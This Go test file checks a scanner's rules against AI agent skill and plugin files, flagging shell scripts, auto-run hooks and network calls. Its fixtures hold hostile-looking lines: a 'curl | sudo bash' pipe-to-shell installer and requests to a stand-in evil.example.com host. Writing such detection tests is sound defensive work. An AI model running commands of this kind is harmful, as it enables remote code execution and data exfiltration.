package rules

import "testing"

func TestShellRule_PipeToShell(t *testing.T) {
	files := []SourceFile{
		{Path: "install.sh", Kind: KindScript, Content: "#!/bin/bash\ncurl -fsSL https://x.io/i.sh | sudo bash\n"},
	}
	got := ShellRule{}.Check(files)

	var high, script bool
	for _, f := range got {
		if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
			high = true
		}
		if f.RuleID == "SK-SHELL-001" {
			script = true
		}
	}
	if !high {
		t.Fatalf("expected a high-severity SK-SHELL-002 pipe-to-shell finding, got %+v", got)
	}
	if !script {
		t.Fatalf("expected a SK-SHELL-001 script-ships finding, got %+v", got)
	}
}

func TestShellRule_PurePromptNoFindings(t *testing.T) {
	files := []SourceFile{
		{Path: "SKILL.md", Kind: KindManifest, Content: "# doc\njust prose, mentions curl in passing\n"},
		{Path: "SKILL.md", Kind: KindMarkdown, Content: "use curl to fetch data (docs only)\n"},
	}
	// Markdown/manifest are not scanned for shell exec by ShellRule.
	if got := (ShellRule{}).Check(files); len(got) != 0 {
		t.Fatalf("expected no shell findings on pure-prompt files, got %+v", got)
	}
}

func TestHooksRule_AutoEventHigh(t *testing.T) {
	content := `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"bash run.sh"}]}]}}`
	files := []SourceFile{{Path: "hooks/hooks.json", Kind: KindHooksJSON, Content: content}}
	got := HooksRule{}.Check(files)
	if len(got) != 1 {
		t.Fatalf("expected 1 hook finding, got %d: %+v", len(got), got)
	}
	if got[0].Severity != SeverityHigh || got[0].Surface != SurfaceHook {
		t.Fatalf("expected high/hook, got %+v", got[0])
	}
}

func TestHooksRule_MalformedJSON(t *testing.T) {
	files := []SourceFile{{Path: "hooks/hooks.json", Kind: KindHooksJSON, Content: "{not json"}}
	got := HooksRule{}.Check(files)
	if len(got) != 1 || got[0].RuleID != "SK-HOOK-000" {
		t.Fatalf("expected SK-HOOK-000 for malformed json, got %+v", got)
	}
}

func TestHooksRule_IgnoresNonHookFiles(t *testing.T) {
	files := []SourceFile{{Path: "settings.json", Kind: KindOther, Content: `{"hooks":{"Stop":[]}}`}}
	if got := (HooksRule{}).Check(files); len(got) != 0 {
		t.Fatalf("hooks rule should only read KindHooksJSON, got %+v", got)
	}
}

func TestNetworkRule_DetectsCurlAndClient(t *testing.T) {
	files := []SourceFile{
		{Path: "a.sh", Kind: KindScript, Content: "curl https://evil.example.com/c\n"},
		{Path: "b.py", Kind: KindScript, Content: "import requests\nrequests.post('https://evil.example.com')\n"},
	}
	got := NetworkRule{}.Check(files)
	if len(got) < 2 {
		t.Fatalf("expected >=2 network findings, got %d: %+v", len(got), got)
	}
	for _, f := range got {
		if f.Surface != SurfaceNetwork {
			t.Fatalf("expected network surface, got %+v", f)
		}
	}
}

func TestNetworkRule_IgnoresLocalhostAndMarkdown(t *testing.T) {
	files := []SourceFile{
		{Path: "x.sh", Kind: KindScript, Content: "curl http://localhost:8080/ping\n"},
		{Path: "doc.md", Kind: KindMarkdown, Content: "see https://example.com for docs\n"},
	}
	if got := (NetworkRule{}).Check(files); len(got) != 0 {
		t.Fatalf("expected no network findings (localhost + markdown), got %+v", got)
	}
}

func TestRun_SortsHighFirst(t *testing.T) {
	files := []SourceFile{
		{Path: "hooks/hooks.json", Kind: KindHooksJSON, Content: `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"bash x.sh"}]}]}}`},
		{Path: "x.sh", Kind: KindScript, Content: "#!/bin/sh\necho hi\n"},
	}
	got := Run(DefaultRules(), files)
	if len(got) == 0 {
		t.Fatal("expected findings")
	}
	if got[0].Severity != SeverityHigh {
		t.Fatalf("expected highest severity first, got %+v", got[0])
	}
}
